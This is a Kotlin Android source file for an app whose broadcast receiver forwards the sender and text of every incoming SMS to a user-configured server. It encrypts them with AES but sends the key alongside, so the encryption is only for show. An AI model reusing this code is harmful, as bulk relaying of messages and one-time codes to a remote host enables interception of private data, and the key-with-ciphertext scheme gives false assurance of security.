package tech.hotash.hotms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.widget.Toast
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent.action) {
            try {
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

                val sharedPreferences = context.getSharedPreferences("AppSettings", Context.MODE_PRIVATE)
                val endpoint = sharedPreferences.getString("api_endpoint", "")
                val key = sharedPreferences.getString("api_key", "")
                val secret = sharedPreferences.getString("api_secret", "")

                if (endpoint.isNullOrEmpty() || key.isNullOrEmpty() || secret.isNullOrEmpty()) {
                    Toast.makeText(context, "API endpoint, key, or secret not set", Toast.LENGTH_SHORT).show()
                    return
                }

                // Generate a key
                val secretKey = CryptoUtils.generateKey()
                val keyString = CryptoUtils.keyToString(secretKey)

                val retrofit = Retrofit.Builder()
                    .baseUrl(if (endpoint.endsWith("/")) endpoint else "$endpoint/")
                    .addConverterFactory(GsonConverterFactory.create())
                    .build()

                val apiService = retrofit.create(ApiService::class.java)

                val bulkData = BulkData(
                    keyString,
                    messages.map {
                        val (senderIv, encryptedSender) = CryptoUtils.encrypt(it.originatingAddress ?: "", secretKey)
                        val (messageIv, encryptedMessage) = CryptoUtils.encrypt(it.messageBody, secretKey)
                        SmsData("$senderIv:$encryptedSender", "$messageIv:$encryptedMessage")
                    }
                )

                apiService.sendBulk(bulkData).enqueue(object : Callback<ResponseBody> {
                    override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
                        // Handle response
                        if (response.isSuccessful) {
                            Log.d("SMS", "Sent to server successfully")
                        } else {
                            Log.e("SMS", "Failed to send to server: ${response.errorBody()?.string()}")
                        }
                    }

                    override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
                        // Handle failure
                        Log.e("SMS", "Failed to send to server", t)
                    }
                })
            } catch (e: Exception) {
                Log.e("SmsReceiver", "Exception caught while processing SMS", e)
            }
        }
    }


    private fun sendToServer(context: Context, sender: String?, message: String) {
        Log.d("SMS", "Received from $sender: $message")
//        val retrofit = Retrofit.Builder()
//            .baseUrl("https://www.tcom1.cyber32.net/api/")
//            .addConverterFactory(GsonConverterFactory.create())
//            .build()
//        val service = retrofit.create(ApiService::class.java)
//        val call = service.sendSms(SmsData(sender, message))
//        call.enqueue(object : Callback<ResponseBody> {
//            override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
//                // Handle response
//                Log.d("SMS", "Sent to server")
//            }
//
//            override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
//                // Handle failure
//                Log.e("SMS", "Failed to send to server")
//            }
//        })
    }
}

interface ApiService {
    @POST("sms")
    fun sendSms(@Body smsData: SmsData): Call<ResponseBody>

    @POST("bulk")
    fun sendBulk(@Body bulkData: BulkData): Call<ResponseBody>
}

data class SmsData(
    val sender: String,
    val message: String,
)

data class BulkData(
    val key: String,
    val messages: List<SmsData>
)

object CryptoUtils {
    private const val ALGORITHM = "AES"
    private const val TRANSFORMATION = "AES/CBC/PKCS5Padding"
    private const val KEY_SIZE = 256

    fun generateKey(): SecretKey {
        val keyGenerator = KeyGenerator.getInstance(ALGORITHM)
        keyGenerator.init(KEY_SIZE)
        return keyGenerator.generateKey()
    }

    fun encrypt(message: String, secretKey: SecretKey): Pair<String, String> {
        val cipher = Cipher.getInstance(TRANSFORMATION)
        val iv = ByteArray(cipher.blockSize)
        cipher.init(Cipher.ENCRYPT_MODE, secretKey)
        val ivParams = cipher.parameters.getParameterSpec(IvParameterSpec::class.java)
        val encryptedBytes = cipher.doFinal(message.toByteArray())
        val ivString = Base64.encodeToString(ivParams.iv, Base64.DEFAULT)
        val encryptedMessage = Base64.encodeToString(encryptedBytes, Base64.DEFAULT)
        return Pair(ivString, encryptedMessage)
    }

    fun keyToString(secretKey: SecretKey): String {
        return Base64.encodeToString(secretKey.encoded, Base64.DEFAULT)
    }

    fun stringToKey(keyString: String): SecretKey {
        val decodedKey = Base64.decode(keyString, Base64.DEFAULT)
        return SecretKeySpec(decodedKey, 0, decodedKey.size, ALGORITHM)
    }
}
